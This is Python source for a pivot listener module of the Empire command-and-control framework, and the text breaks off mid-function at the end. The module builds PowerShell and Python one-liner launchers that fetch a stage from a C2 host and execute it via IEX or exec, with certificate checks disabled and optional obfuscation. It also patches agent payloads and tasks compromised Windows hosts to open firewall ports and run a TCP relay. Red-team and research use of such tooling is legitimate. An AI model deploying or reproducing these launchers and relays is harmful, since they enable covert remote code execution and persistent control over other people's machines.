import base64
import copy
import ipaddress
import logging
import os
import re
import secrets
import time
from urllib.parse import urlparse

from cryptography.hazmat.primitives import serialization

from empire.server.common import helpers, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.utils import data_util, listener_util

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)

# Sentinels written by relay.ps1 / relay.py around the bind() call. The
# listener's start() polls task output for these so it can distinguish a
# successful bind from a fast-failing relay (e.g. port already in use).
_LISTEN_OK_SENTINEL = "[port_forward_pivot] LISTEN_OK"
_LISTEN_FAIL_SENTINEL = "[port_forward_pivot] LISTEN_FAIL"

# RFC 1123 hostname label: alphanumerics + hyphens, hyphens not at the
# edges, 1..63 chars. We validate per-label rather than against the full
# string to keep the regex readable.
_HOSTNAME_LABEL = re.compile(r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)$")

# Attributes an http-family listener exposes for staging key negotiation. The
# pivot has none of its own; it borrows the parent listener's (see
# _staging_cert_key_options). A parent lacking these (smb, http_foreign,
# http_hop, another pivot) cannot back a port_forward_pivot.
_PARENT_STAGING_KEY_ATTRS = (
    "agent_private_cert_key_object",
    "server_private_cert_key_object",
    "agent_private_cert_key",
    "agent_public_cert_key",
    "server_public_cert_key",
)


def _validate_host(host, field_name: str) -> str:
    """Reject anything that isn't a syntactically valid IP literal or a
    strict RFC-1123 hostname.

    The relay templates render `host` into PowerShell/Python source as
    quoted strings (`$x = "{{ host }}"`, `LISTEN_HOST = "{{ host }}"`).
    Without validation, a value containing `"`, `;`, backtick, `$`, or a
    newline would either break the script or inject code on the agent.
    Limiting to IPs and hostnames removes that whole class of footgun.
    """
    if not isinstance(host, str) or not host:
        raise ValueError(f"{field_name}: must be a non-empty string")
    # IPv6 literals may arrive bracketed (e.g. "[::1]"); strip brackets
    # before handing to ipaddress, which doesn't accept them.
    candidate = host.strip()
    if candidate.startswith("[") and candidate.endswith("]"):
        candidate = candidate[1:-1]
    try:
        ipaddress.ip_address(candidate)
    except ValueError:
        pass
    else:
        return host
    if len(host) > 253:
        raise ValueError(f"{field_name}: hostname too long ({len(host)} > 253)")
    labels = host.split(".")
    if not labels or any(not _HOSTNAME_LABEL.match(label) for label in labels):
        raise ValueError(f"{field_name}: must be a valid IP or hostname (got {host!r})")
    return host


def _validate_port(port, field_name: str) -> int:
    """Port must coerce to an int in [1, 65535]."""
    try:
        port_int = int(port)
    except (TypeError, ValueError) as e:
        raise ValueError(
            f"{field_name}: must be an integer 1..65535 (got {port!r})"
        ) from e
    if not 1 <= port_int <= 65535:
        raise ValueError(f"{field_name}: out of range (got {port_int})")
    return port_int


def _split_connect_target(host: str, port) -> tuple[str, int]:
    # An embedded port in `host` (e.g. "https://x:8443") wins over the `port` arg.
    candidate = host if "://" in host else f"//{host}"
    parsed = urlparse(candidate, scheme="http")
    connect_host = parsed.hostname or host
    connect_port = parsed.port or int(port)
    return connect_host, connect_port


def _firewall_rule_name(session_id: str, listen_port) -> str:
    return f"empire-pivot-{session_id}-{int(listen_port)}"


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.mainMenu = mainMenu
        self.thread = None

    def post_init(self):
        self.host_address = None
        self._relay_task_id = None
        # Name of the listener the pivoted agent is homed on. Set in start().
        # generate_stager() needs it to resolve the parent listener's staging
        # certificate keys — stage 2 is validated against the parent's keys,
        # not the pivot's (the pivot has none of its own).
        self.parent_listener_name = None

        self.instance_log = log

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        self.instance_log.info("default_response() not implemented for pivot listeners")
        return b""

    def validate_options(self) -> None:
        """
        Validate all options for this listener.
        """
        pass

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        language=None,
        listener_name=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            log.error("listeners/template generate_launcher(): no language specified!")
            return None

        launcher = self.options["Launcher"]["Value"]
        stagingKey = self.options["StagingKey"]["Value"]
        profile = self.options["DefaultProfile"]["Value"]
        uris = list(profile.split("|")[0].split(","))
        stage0 = secrets.choice(uris)
        customHeaders = profile.split("|")[2:]

        if language == "powershell":
            stager = '$ErrorActionPreference = "SilentlyContinue";'

            for bypass in bypasses:
                stager += bypass

            stager += "$wc=New-Object System.Net.WebClient;"

            if user_agent.lower() == "default":
                profile = self.options["DefaultProfile"]["Value"]
                user_agent = profile.split("|")[1]
            stager += f"$u='{user_agent}';"

            if "https" in self.host_address:
                # allow for self-signed certificates for https connections
                stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            if user_agent.lower() != "none" or proxy.lower() != "none":
                if user_agent.lower() != "none":
                    stager += "$wc.Headers.Add('User-Agent',$u);"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"

                    else:
                        # TODO: implement form for other proxy
                        stager += f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');"
                        stager += "$wc.Proxy = $proxy;"

                    if proxy_creds.lower() == "default":
                        stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                    else:
                        # TODO: implement form for other proxy credentials
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        if len(username.split("\\")) > 1:
                            usr = username.split("\\")[1]
                            domain = username.split("\\")[0]
                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}','{password}','{domain}');"

                        else:
                            usr = username.split("\\")[0]
                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}','{password}');"

                        stager += "$wc.Proxy.Credentials = $netcred;"

                    # save the proxy settings to use during the entire staging process and the agent
                    stager += "$Script:Proxy = $wc.Proxy;"

            # check if we're using IPv6

            # code to turn the key string into a byte array
            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                stagingKey,
                sessionID="00000000",
                language="POWERSHELL",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")

            # stager += "$ser="+helpers.obfuscate_call_home_address(host)+";$t='"+stage0+"';"
            stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';$hop='{listener_name}';"
            stager += "$wc.Headers.Add('Hop-Name',$hop);"

            # Add custom headers if any
            if customHeaders != []:
                for header in customHeaders:
                    headerKey = header.split(":")[0]
                    headerValue = header.split(":")[1]
                    # If host header defined, assume domain fronting is in use and add a call to the base URL first
                    # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                    if headerKey.lower() == "host":
                        stager += "try{$ig=$wc.DownloadData($ser)}catch{};"

                    stager += f'$wc.Headers.Add("{headerKey}","{headerValue}");'

            # add the routing packet to a cookie

            stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
            stager += "$data=$wc.DownloadData($ser+$t);"

            # The http listener returns the stage as plaintext (not RC4), so
            # IEX it directly — matches empire/server/listeners/http/listener.py.
            stager += "IEX ([Text.Encoding]::UTF8.GetString($data))"

            # Remove comments and make one line
            stager = helpers.strip_powershell_comments(stager)
            stager = data_util.ps_convert_to_oneliner(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            # base64 encode the stager and return it
            if encode and (
                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
            ):
                return helpers.powershell_launcher(stager, launcher)
            # otherwise return the case-randomized stager
            return stager

        if language.startswith("py"):
            # Python

            launcherBase = "import sys;"
            if "https" in self.host_address:
                # monkey patch ssl woohooo
                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

            for bypass in bypasses:
                launcherBase += bypass

            if user_agent.lower() == "default":
                profile = self.options["DefaultProfile"]["Value"]
                user_agent = profile.split("|")[1]

            launcherBase += "import urllib.request;\n"
            launcherBase += f"UA='{user_agent}';"
            launcherBase += f"server='{self.host_address}';t='{stage0}';"

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                stagingKey,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("utf-8")

            launcherBase += "req=urllib.request.Request(server+t);\n"
            # add the routing packet to a cookie
            launcherBase += "req.add_header('User-Agent',UA);\n"
            launcherBase += (
                f"req.add_header('Cookie',\"session={b64RoutingPacket}\");\n"
            )

            # Add custom headers if any
            if customHeaders != []:
                for header in customHeaders:
                    headerKey = header.split(":")[0]
                    headerValue = header.split(":")[1]
                    # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                    launcherBase += f'req.add_header("{headerKey}","{headerValue}");\n'

            if proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += (
                        "proxy = urllib.request.ProxyHandler({'"
                        + proto
                        + "':'"
                        + proxy
                        + "'});\n"
                    )

                if proxy_creds != "none":
                    if proxy_creds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"
                    else:
                        launcherBase += "proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();\n"
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        launcherBase += (
                            "proxy_auth_handler.add_password(None,'"
                            + proxy
                            + "','"
                            + username
                            + "','"
                            + password
                            + "');\n"
                        )
                        launcherBase += "o = urllib.request.build_opener(proxy, proxy_auth_handler);\n"
                else:
                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
            else:
                launcherBase += "o = urllib.request.build_opener();\n"

            # install proxy and creds globally, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o);\n"
            launcherBase += "data=urllib.request.urlopen(req).read();\n"

            # download the stager and extract the IV
            launcherBase += listener_util.python_extract_stager(stagingKey)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )
                launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
            return launcherBase

        if language == "csharp":
            workingHours = self.options["WorkingHours"]["Value"]
            killDate = self.options["KillDate"]["Value"]
            customHeaders = profile.split("|")[2:]
            delay = self.options["DefaultDelay"]["Value"]
            jitter = self.options["DefaultJitter"]["Value"]
            lostLimit = self.options["DefaultLostLimit"]["Value"]

            stager_yaml = (
                self.mainMenu.install_path / "stagers/Sharpire.yaml"
            ).read_text(encoding="utf-8")
            stager_yaml = (
                stager_yaml.replace("{{ REPLACE_ADDRESS }}", self.host_address)
                .replace("{{ REPLACE_SESSIONKEY }}", stagingKey)
                .replace("{{ REPLACE_PROFILE }}", profile)
                .replace("{{ REPLACE_WORKINGHOURS }}", workingHours)
                .replace("{{ REPLACE_KILLDATE }}", killDate)
                .replace("{{ REPLACE_DELAY }}", str(delay))
                .replace("{{ REPLACE_JITTER }}", str(jitter))
                .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
            )

            return self.mainMenu.dotnet_compiler.compile_stager(
                stager_yaml, "Sharpire", confuse=obfuscate
            )

        if language == "go":
            return str(
                self.mainMenu.stagergenv2.generate_go_stageless(
                    self.options, listener_name=listener_name
                )
            )

        log.error(
            "listeners/port_forward_pivot generate_launcher(): invalid language specification: only 'powershell', 'python', 'csharp', and 'go' are supported for this module."
        )
        return None

    def _staging_cert_key_options(self, language):
        """Resolve the parent listener this pivot relays through and return the
        ed25519 staging certificate keys the http stage-1 templates require.

        These MUST come from the parent listener: the new agent's stage-2 POST
        is handled by the parent http listener, which signs and validates
        staging with its OWN keys (agent_public_cert_key verifies the agent's
        cert; server_private_cert_key signs the server response — see
        http/listener.py handle_post). If the stage-1 stager is baked with
        anything else — or, as before this fix, with nothing at all — the
        agent's server-cert check fails and it never requests stage 2. Returns
        None (and logs) if the parent isn't active.
        """
        if self.parent_listener_name is None:
            log.error(
                "listeners/port_forward_pivot generate_stager(): called before "
                "start(); parent_listener_name is unset, cannot resolve staging "
                "certificate keys"
            )
            return None

        parent = self.mainMenu.listenersv2.get_active_listener_by_name(
            self.parent_listener_name
        )
        if parent is None:
            log.error(
                "listeners/port_forward_pivot generate_stager(): parent listener "
                f"{self.parent_listener_name!r} is not active; cannot embed "
                "staging certificate keys"
            )
            return None

        # start() rejects parents that lack these, but guard here too: a stale
        # or non-http-family parent instance would otherwise raise an opaque
        # AttributeError that surfaces to the agent as a bare HTTP 500.
        missing = [
            attr for attr in _PARENT_STAGING_KEY_ATTRS if not hasattr(parent, attr)
        ]
        if missing:
            log.error(
                "listeners/port_forward_pivot generate_stager(): parent listener "
                f"{self.parent_listener_name!r} (type {type(parent).__module__}) "
                f"does not provide staging keys {missing}; port_forward_pivot "
                "requires an http/http_malleable parent"
            )
            return None

        if language.lower() == "powershell":
            private_bytes = parent.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )
            agent_public_bytes = (
                parent.agent_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            server_public_bytes = (
                parent.server_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            return {
                "agent_private_cert_key": ",".join(f"0x{b:02x}" for b in private_bytes),
                "agent_public_cert_key": ",".join(
                    f"0x{b:02x}" for b in agent_public_bytes
                ),
                "server_public_cert_key": ",".join(
                    f"0x{b:02x}" for b in server_public_bytes
                ),
            }

        return {
            "agent_private_cert_key": parent.agent_private_cert_key,
            "agent_public_cert_key": parent.agent_public_cert_key,
            "server_public_cert_key": parent.server_public_cert_key,
        }

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        if not language:
            log.error("listeners/http generate_stager(): no language specified!")
            return None

        profile = listenerOptions["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        listenerOptions["Launcher"]["Value"]
        stagingKey = listenerOptions["StagingKey"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        host = listenerOptions["Host"]["Value"]

        # select some random URIs for staging from the main profile
        stage1 = secrets.choice(uris)
        stage2 = secrets.choice(uris)

        if language.lower() == "powershell":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            cert_key_options = self._staging_cert_key_options(language)
            if cert_key_options is None:
                return None

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1.j2")
            custom_headers = listener_util.parse_custom_headers(profile)

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": listenerOptions["Cookie"]["Value"],
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
                "custom_headers": custom_headers,
                **cert_key_options,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager, obfuscation_command=obfuscation_command
                )
                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)

            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(stager)

            return stager

        if language.lower() == "python":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            cert_key_options = self._staging_cert_key_options(language)
            if cert_key_options is None:
                return None

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.py.j2")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": stagingKey,
                "profile": profile,
                "session_cookie": listenerOptions["Cookie"]["Value"],
                "host": host,
                "stage_1": stage1,
                "stage_2": stage2,
                **cert_key_options,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)

            # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)

            return stager

        if language.lower() in ("csharp", "go"):
            # csharp (Sharpire) and go (Gopire) are stageless — the compiled
            # binary produced in generate_launcher() IS the stage.
            return ""

        log.error(
            "listeners/port_forward_pivot generate_stager(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are supported for this module."
        )
        return None

    def generate_agent(
        self,
        listenerOptions,
        language=None,
        obfuscate=False,
        obfuscation_command="",
        version="",
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        if not language:
            log.error("listeners/http generate_agent(): no language specified!")
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        killDate = listenerOptions["KillDate"]["Value"]
        workingHours = listenerOptions["WorkingHours"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == "powershell":
            code = (self.mainMenu.install_path / "data/agent/agent.ps1").read_text(
                encoding="utf-8"
            )

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("$AgentDelay = 60", "$AgentDelay = " + str(delay))
            code = code.replace("$AgentJitter = 0", "$AgentJitter = " + str(jitter))
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                '$Profile = "' + str(profile) + '"',
            )
            code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
            code = code.replace(
                '$DefaultResponse = ""',
                '$DefaultResponse = "' + str(b64DefaultResponse) + '"',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace(
                    "$KillDate,", "$KillDate = '" + str(killDate) + "',"
                )
            if obfuscate:
                code = self.mainMenu.obfuscationv2.obfuscate(
                    code,
                    obfuscation_command=obfuscation_command,
                )
                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)

            return code

        if language == "python":
            agent_path = (
                self.mainMenu.install_path / "data/agent/ironpython_agent.py"
                if version == "ironpython"
                else self.mainMenu.install_path / "data/agent/agent.py"
            )
            code = agent_path.read_text(encoding="utf-8")

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace("delay = 60", f"delay = {delay}")
            code = code.replace("jitter = 0.0", f"jitter = {jitter}")
            code = code.replace(
                'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'profile = "{profile}"',
            )
            code = code.replace("lostLimit = 60", f"lostLimit = {lostLimit}")
            code = code.replace(
                'defaultResponse = base64.b64decode("")',
                f'defaultResponse = base64.b64decode("{b64DefaultResponse}")',
            )

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', f'killDate = "{killDate}"')
            if workingHours != "":
                code = code.replace('workingHours = ""', f'workingHours = "{killDate}"')

            if obfuscate:
                code = self.mainMenu.obfuscationv2.python_obfuscate(code)
                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
            return code

        if language in ("csharp", "go"):
            return ""

        log.error(
            "listeners/port_forward_pivot generate_agent(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are supported for this module."
        )
        return None

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.
        This is so agents can easily be dynamically updated for the new listener.

        This should be implemented for the module.
        """
        if not language:
            log.error("listeners/http generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1.j2")

            template_options = {
                "session_cookie": listenerOptions["Cookie"]["Value"],
                "host": self.host_address,
                "custom_headers": listener_util.parse_custom_headers(
                    listenerOptions["DefaultProfile"]["Value"]
                ),
            }

            return template.render(template_options)

        if language.lower() == "python":
            template_path = [
                self.mainMenu.install_path / "listeners",
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.py.j2")

            template_options = {
                "session_cookie": listenerOptions["Cookie"]["Value"],
                "host": self.host_address,
            }

            return template.render(template_options)

        if language.lower() in ("csharp", "go"):
            return ""

        log.error(
            "listeners/port_forward_pivot generate_comms(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are supported for this module."
        )
        return None

    def start(self):
        """
        If a server component needs to be started, implement the kick off logic
        here and the actual server code in another function to facilitate threading
        (i.e. start_server() in the http listener).
        """
        name = self.options["Name"]["Value"]
        try:
            tempOptions = copy.deepcopy(self.options)
            with SessionLocal.begin() as db:
                agent = self.mainMenu.agentsv2.get_by_id(
                    db, self.options["Agent"]["Value"]
                )
                if agent is None:
                    log.error(
                        f"{name}: agent {self.options['Agent']['Value']} not found"
                    )
                    return False
                listenerName = agent.listener
                if not tempOptions["internalIP"]["Value"]:
                    tempOptions["internalIP"]["Value"] = agent.internal_ip

                parent_listener = self.mainMenu.listenersv2.get_by_name(
                    db, listenerName
                )

                if parent_listener:
                    # Use the parent's options as the base (Host, Port, Profile,
                    # StagingKey, etc.) but preserve the pivot-specific keys so
                    # shutdown() can still find ListenPort/Agent/internalIP.
                    self.options = copy.deepcopy(parent_listener.options)
                    self.options["Name"]["Value"] = name
                    for k in ("Agent", "internalIP", "ListenPort"):
                        if k in tempOptions:
                            self.options[k] = copy.deepcopy(tempOptions[k])
                    # Remember the parent so generate_stager() can pull its
                    # staging certificate keys (see post_init note).
                    self.parent_listener_name = listenerName
                else:
                    log.error("Parent listener not found")
                    return False

                # validate that the Listener does exist
                active_parent = self.mainMenu.listenersv2.get_active_listener_by_name(
                    listenerName
                )
                if not active_parent:
                    log.error(f"{listenerName}: Listener does not exist")
                    return False

                # The pivot borrows the parent's staging certificate keys at
                # stage-1 time. Reject a parent that can't provide them now, while
                # the operator is watching, rather than failing later with an
                # opaque HTTP 500 when the pivoted agent tries to stage.
                missing = [
                    attr
                    for attr in _PARENT_STAGING_KEY_ATTRS
                    if not hasattr(active_parent, attr)
                ]
                if missing:
                    log.error(
                        f"{listenerName}: parent listener (type "
                        f"{type(active_parent).__module__}) does not provide staging "
                        f"keys {missing}; port_forward_pivot requires an "
                        "http/http_malleable parent. Re-home the agent or choose a "
                        "different parent listener."
                    )
                    return False

                # check if a listener for the agent already exists
                if self.mainMenu.listenersv2.get_active_listener_by_name(
                    tempOptions["Name"]["Value"]
                ):
                    log.error(
                        f"{listenerName}: Pivot listener already exists on agent {tempOptions['Name']['Value']}"
                    )
                    return False

                listen_address = tempOptions["internalIP"]["Value"]
                listen_port = tempOptions["ListenPort"]["Value"]
                connect_host, connect_port = _split_connect_target(
                    self.options["Host"]["Value"], self.options["Port"]["Value"]
                )
                # Reject hostile values BEFORE we queue any tasks. The relay
                # templates render these into agent-side source code (quoted
                # strings + raw ints), so a `"` or `;` in a host or a non-int
                # port would break the script or inject code. Failing fast
                # also prevents leaving a stale firewall rule for a relay
                # that never got tasked.
                try:
                    listen_address = _validate_host(listen_address, "internalIP")
                    connect_host = _validate_host(connect_host, "Host")
                    listen_port = _validate_port(listen_port, "ListenPort")
                    connect_port = _validate_port(connect_port, "Port")
                except ValueError:
                    log.exception(f"{listenerName}: invalid listener config")
                    return False

                language = agent.language.lower()

                if language in ("powershell", "csharp", "go"):
                    if not agent.high_integrity:
                        log.error(
                            f"{listenerName}: Windows agents must be elevated for port_forward_pivot — admin is needed to pre-authorize the inbound firewall rule that lets the relay bind without a 'Allow access' prompt"
                        )
                        return False
                    # Sharpire/Gopire need recently-added agent features to host the
                    # backgrounded relay (Sharpire: multi-packet tasking blob decoding;
                    # Gopire: backgrounded TASK_POWERSHELL_CMD_JOB + TASK_STOPJOB).
                    # We can't gate on agent.language_version because that field tracks
                    # the language *runtime* (.NET / Go), not the agent build. Until a
                    # build-version field exists, warn the operator and ask them to
                    # confirm the relay actually came up via 'jobs' on the agent.
                    if language in ("csharp", "go"):
                        required = (
                            "Sharpire build with multi-packet tasking blob decoding"
                            if language == "csharp"
                            else "Gopire build with backgrounded TASK_POWERSHELL_CMD_JOB + TASK_STOPJOB support"
                        )
                        log.warning(
                            f"{listenerName}: {language} pivot requires a {required}. "
                            "Older builds will fail to install the relay silently — "
                            f"after start, verify via 'jobs' on agent {agent.session_id}."
                        )
                    rule_name = _firewall_rule_name(agent.session_id, listen_port)
                    _, fw_err = self.mainMenu.agenttasksv2.create_task_shell(
                        db,
                        agent,
                        f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=allow protocol=TCP localport={listen_port} enable=yes',
                    )
                    if fw_err:
                        log.error(
                            f"{listenerName}: failed to queue firewall rule add: {fw_err}"
                        )
                        return False
                    relay_code = self._render_relay(
                        "port_forward_pivot/relay.ps1.j2",
                        listen_host=listen_address,
                        listen_port=listen_port,
                        connect_host=connect_host,
                        connect_port=connect_port,
                    )
                    task_name = "TASK_POWERSHELL_CMD_JOB"
                elif language == "python":
                    relay_code = self._render_relay(
                        "port_forward_pivot/relay.py.j2",
                        listen_host=listen_address,
                        listen_port=listen_port,
                        connect_host=connect_host,
                        connect_port=connect_port,
                    )
                    task_name = "TASK_PYTHON_CMD_JOB"
                else:
                    log.error(
                        f"{listenerName}: port_forward_pivot does not support agent language '{language}'"
                    )
                    return False

                task, err = self.mainMenu.agenttasksv2.add_task(
                    db, agent, task_name, relay_code
                )
                if err or task is None:
                    log.error(f"{listenerName}: failed to task relay: {err}")
                    return False
                self._relay_task_id = task.id
                self.mainMenu.agentsv2.save_agent_log(
                    tempOptions["Agent"]["Value"],
                    f"Tasked agent to install Pivot listener (TCP relay, job {task.id})",
                )
                # Capture for the post-session verification poll. The agent
                # ORM object is bound to this session and shouldn't be read
                # outside the with-block.
                relay_task_id_for_poll = task.id
                agent_session_for_poll = agent.session_id
            # End of `with SessionLocal.begin()`: tasks are committed and
            # the agent will fetch them on its next check-in.

            return self._verify_relay_started(
                task_id=relay_task_id_for_poll,
                agent_session_id=agent_session_for_poll,
                language=language,
                listen_address=listen_address,
                listen_port=listen_port,
                listener_name=listenerName,
            )
        except Exception as e:
            log.error(f'Listener "{name}" failed to start: {e}', exc_info=True)
            return False

    def _verify_relay_started(
        self,
        task_id: int,
        agent_session_id: str,
        language: str,
        listen_address: str,
        listen_port,
        listener_name: str,
    ) -> bool:
        """Post-tasking verification (D1 in the review plan).

        Polls the agent's task output for a few seconds for a bind sentinel.
        Catches fast-failing relays (port-in-use, missing agent capability)
        without blocking long enough to be UX-painful when the agent is
        merely slow checking in.

        Returns True if the relay was confirmed bound, OR if the poll timed
        out (we don't want to block listener creation on slow agents — the
        operator gets a warning telling them to verify with 'jobs').

        Returns False only when the relay actively reported a bind failure.
        In that case we also queue a best-effort firewall-rule cleanup so
        we don't leave a stale rule for a relay that never came up.
        """
        test_mode = bool(os.environ.get("TEST_MODE"))
        timeout_seconds = 0.0 if test_mode else 8.0
        poll_interval = 0.0 if test_mode else 0.5

        outcome = self._await_relay_sentinel(
            task_id, agent_session_id, timeout_seconds, poll_interval
        )

        if outcome == "error":
            log.error(
                f"{listener_name}: relay reported bind failure on agent "
                f"{agent_session_id} — see task {task_id} output for details"
            )
            if language in ("powershell", "csharp", "go"):
                self._queue_firewall_delete(
                    agent_session_id, listen_port, listener_name
                )
            self._relay_task_id = None
            return False

        if outcome == "ok":
            log.info(
                f"{listener_name}: relay confirmed listening on "
                f"{listen_address}:{listen_port}"
            )
        elif timeout_seconds > 0:
            log.warning(
                f"{listener_name}: relay tasked but bind not yet confirmed "
                f"within {timeout_seconds}s — agent may be slow checking in "
                f"or the relay may have failed silently. Verify via 'jobs' "
                f"on agent {agent_session_id}."
            )
        return True

    def _await_relay_sentinel(
        self,
        task_id: int,
        agent_session_id: str,
        timeout_seconds: float,
        poll_interval: float,
    ) -> str | None:
        """Poll the agent task output for the relay's bind sentinel.

        Returns:
            "ok"    — relay confirmed listening (LISTEN_OK observed).
            "error" — relay reported bind failure (LISTEN_FAIL observed) or
                      the task entered an error status.
            None    — no signal within the timeout window.
        """
        if timeout_seconds <= 0:
            return None
        deadline = time.monotonic() + timeout_seconds
        while True:
            with SessionLocal() as db:
                task = self.mainMenu.agenttasksv2.get_task_for_agent(
                    db, agent_session_id, task_id
                )
                if task is not None:
                    output = task.output or ""
                    if _LISTEN_OK_SENTINEL in output:
                        return "ok"
                    if (
                        _LISTEN_FAIL_SENTINEL in output
                        or task.status == models.AgentTaskStatus.error
                    ):
                        return "error"
            if time.monotonic() >= deadline:
                return None
            time.sleep(poll_interval)

    def _queue_firewall_delete(
        self, agent_session_id: str, listen_port, listener_name: str
    ) -> None:
        """Best-effort firewall-rule cleanup, used by start() when the relay
        reports a bind failure. The rule name is deterministic, so the
        netsh delete is idempotent and safe to repeat."""
        rule_name = _firewall_rule_name(agent_session_id, listen_port)
        try:
            with SessionLocal.begin() as db:
